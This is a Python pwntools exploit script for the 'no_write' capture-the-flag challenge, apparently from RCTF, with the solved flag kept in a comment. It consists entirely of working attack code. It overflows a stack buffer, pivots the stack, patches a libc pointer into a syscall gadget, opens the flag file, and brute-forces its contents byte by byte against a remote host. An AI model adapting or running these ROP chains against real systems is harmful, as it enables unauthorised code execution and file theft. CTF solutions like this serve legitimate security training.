from pwn import *
import string

flag = ""
#RCTF{C0mpare_f1ag_0ne_bY_oNe}

prdi = 0x0000000000400773
prsipr15 = 0x0000000000400771
leaveret = 0x000000000040067b
prbp = 0x0000000000400588

poprbxrbpr12_15 = 0x00000000040076A
addrbp_3d_ebx = 0x00000000004005e8 #0x00000000004005e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret

read = 0x00000000004004F0


for idx in range(len(flag),0x30) :
    for c in string.printable :
        #p = process("./no_write")
        p = remote("129.211.134.166",6000)

        try :
            print '[{0}] : {1}'.format(idx,c)

            pay = "A"*0x10 + p64(0x0000000000601880 - 8) # rsp
            pay += p64(prsipr15) + p64(0x0000000000601880) + p64(0)
            pay += p64(read) + p64(leaveret)

            p.send(pay)

            sleep(0.05)

            #__libc_start_main_ptr + 231 in bss

            pay2  = p64(prdi)
            pay2 += p64(0x0000000004006C0) #readn
            pay2 += p64(prsipr15)
            pay2 += p64(0x6017f0) #buf
            pay2 += p64(0)
            pay2 += p64(0x0000000000400544) #call    cs:__libc_start_main_ptr
            p.send(pay2)

            sleep(0.05)

            #make open
            pay3  = p64(poprbxrbpr12_15)
            pay3 += p64(0xc329e) #libc_start_main+231 - syscall
            pay3 += p64(0x6017e8+0x3d) #&libc_start_main
            pay3 += p64(0)*4
            pay3 += p64(addrbp_3d_ebx)

            #make rop of open and the after

            #read rop
            pay3 += p64(prsipr15)
            pay3 += p64(0x6017e8-72) #sub length of pay4
            pay3 += p64(0)
            pay3 += p64(read)

            #the after
            pay3 += p64(prsipr15)
            pay3 += p64(0x6017f0)
            pay3 += p64(0)
            pay3 += p64(read)

            pay3 += p64(prbp)
            pay3 += p64(0x6017e8-72-8)
            pay3 += p64(leaveret)
            pay3 += "/home/no_write/flag"


            p.send(pay3)

            sleep(0.05)

            #send open of rop

            # for setting open syscall number
            pay4  = p64(prsipr15)
            pay4 += p64(0x601600)*2
            pay4 += p64(read)

            pay4 += p64(prdi)
            pay4 += p64(0x601888) #path
            pay4 += p64(prsipr15)
            pay4 += p64(0) * 2

            p.send(pay4)

            sleep(0.05)

            pay5 = p64(prdi)
            pay5 += p64(0)
            pay5 += p64(prsipr15)
            pay5 += p64(0x601400)*2
            pay5 += p64(read)
            pay5 += p64(prbp)
            pay5 += p64(0x601400-8)
            pay5 += p64(leaveret)

            p.send(pay5)



            sleep(0.05)

            p.send("A"*2)

            #read flag
            sleep(0.05)
            pay6  = p64(poprbxrbpr12_15)
            pay6 += p64(0x4b881) #execvesyscall - pop rdx
            pay6 += p64(0x6017e8+0x3d) #&execvesyscall
            pay6 += p64(0)*4
            pay6 += p64(addrbp_3d_ebx)

            #read flag
            pay6 += p64(prsipr15)
            pay6 += p64(0x6017e8-40) #sub length of pay6
            pay6 += p64(0)
            pay6 += p64(read)

            #the after
            pay6 += p64(prsipr15)
            pay6 += p64(0x6017f0)
            pay6 += p64(0)
            pay6 += p64(read)

            pay6 += p64(prbp)
            pay6 += p64(0x6017e8-40-8)
            pay6 += p64(leaveret)

            p.send(pay6)

            sleep(0.05)
            pay6  = p64(prdi)
            pay6 += p64(3) #flag fd
            pay6 += p64(prsipr15)
            pay6 += p64(0x601900-idx)*2 # read flag - N byte

            p.send(pay6)

            sleep(0.05)
            pay7  = p64(idx+1) #rdx flag N byte
            pay7 += p64(read)

            #read getting flag payload
            pay7 += p64(prdi)
            pay7 += p64(0x601838)
            pay7 += p64(prsipr15)
            pay7 += p64(0x100) * 2

            pay7 += p64(0x00000000004006C0) # readn
            pay7 += p64(prbp)
            pay7 += p64(0x601838-8)
            pay7 += p64(leaveret)

            p.send(pay7)

            sleep(0.05)
            pay8  = p64(prdi)
            pay8 += p64(0)
            pay8 += p64(prsipr15)
            pay8 += p64(0x601100 + ord(c) * 8) * 2
            pay8 += p64(read)

            #pop rbx = one byte of flag
            pay8 += p64(prsipr15)
            pay8 += p64(0x601900-8)*2
            pay8 += p64(read)

            pay8 += p64(prsipr15)
            pay8 += p64(0x601900+8)*2
            pay8 += p64(read)

            pay8 += p64(prbp)
            pay8 += p64(0x601900-16)
            pay8 += p64(leaveret)

            p.send(pay8)
            sleep(0.05)
            p.send(p64(read))

            sleep(0.05)
            p.send(p64(poprbxrbpr12_15))

            sleep(0.05)

            pay9  = p64(0) #rbp
            pay9 += p64(0x601100) #r12
            pay9 += p64(0) * 3 # r13 ~ r15
            pay9 += p64(0x0000000000400759)  # call    qword ptr [r12+rbx*8]

            p.send(pay9)


            #after executing above rop , open the path file
            p.recvline(timeout=1)

            flag += c
            print 'FOUND!'
            print flag
            p.close()
            break

        except KeyboardInterrupt :
            exit(1)

        except :
            p.close()

